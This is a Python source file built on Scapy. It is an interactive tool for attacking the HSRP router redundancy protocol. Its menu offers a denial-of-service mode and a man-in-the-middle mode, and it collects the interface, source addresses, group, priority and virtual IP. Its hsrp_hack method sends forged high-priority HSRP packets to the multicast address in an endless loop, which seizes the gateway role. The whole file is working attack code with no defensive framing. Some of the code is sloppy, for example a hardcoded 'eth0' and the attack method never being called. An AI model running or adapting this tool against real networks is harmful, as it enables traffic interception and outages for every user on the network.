from scapy.all import *

class Attack:
    def __init__(self, type, iface, srcIP, srcHW, group, priority, vIP):
        self.type = type
        self.iface = iface
        self.srcIP = srcIP
        self.srcHW = srcHW
        self.group = group
        self.priority = priority
        self.vIP = vIP

    def show(self):
        print(f"Attack options: \niface = {self.iface} \nsrcIP = {self.srcIP} \nsrcHW  {self.srcHW} \ngroup = {self.group} \npriority = {self.priority} \nvIP = {self.vIP}")
    
    def hsrp_hack(self):
        ip = IP(src=self.srcIP, dst='224.0.0.2')
        udp = UDP(sport=1985,dport=1985)
        hsrp = HSRP(group=self.group, priority=self.priority, virtualIP=self.vIP)
        toSend = ip/udp/hsrp
        toSend.show()
        send(toSend, iface='eth0', inter=3, loop=1)

def choose_attack():
    while (True):
        attack_choice = input("Hi, please enter type of attack to perform: \n1. HSRP DOS attack \n2. HSRP MiTM attack\n")
        att_choice = convert_to_int(attack_choice)
        if(isinstance(att_choice,int) and att_choice == 1):
            print("HSRP DOS attack chosen.")
            return 1
        elif(att_choice == 2):
            print("HSRP MiTM attack chosen.")
            return 2

def choose_inter():
    while (True):
        print("Please input interface to attack on:")
        interfaces = get_if_list()
        no_of_int= len(interfaces)
        if(no_of_int > 0):
            for i in range(1,no_of_int+1):
                print(i,": ", interfaces[i-1])
            int_choice  = input()
            int_choice = convert_to_int(int_choice)
            if(no_of_int >= int_choice and int_choice > 0):
                print("test")
                iface_choice = interfaces[int_choice-1]
                return iface_choice
        else:
            print("No interfaces deteced. Please check interfaces.")
            exit()

def convert_to_int(string):
    try:
        string = int(string)
        return string
    except:
        return 10

def menu():
    while(True):
        att_choice = choose_attack()
        iface = choose_inter()
        srcIP = input("Source IP ("+ get_if_addr(iface)+"): ")
        srcHW = input("Source HW ("+ get_if_hwaddr(iface)+"): ")
        group = input("HSRP Group (1): ")
        priority = input("HSRP Priority (250): ")
        vIP = input("HSRP Virtual IP (192.168.1.254): ")
        if(srcIP == ""):
            srcIP = get_if_addr(iface)
        if(srcHW == ""):
            srcHW = get_if_hwaddr(iface)
        if(group== ""):
            group = 1
        if(priority == ""):
            priority = 200
        if(vIP== ""):
            vIP = "192.168.1.254"
        print(f"Options: \niface = {iface} \nsrcIP = {srcIP} \nsrcHW  {srcHW} \nroup = {group} \npriority = {priority} \nvIP = {vIP}")
        confirm = input("Confirm? ==> (1) ")
        if(convert_to_int(confirm) == 1 or confirm == ""):
            return Attack(att_choice,iface,srcIP,srcHW,group,priority,vIP)

if __name__  == "__main__":
    attack = menu()
    attack.show()
    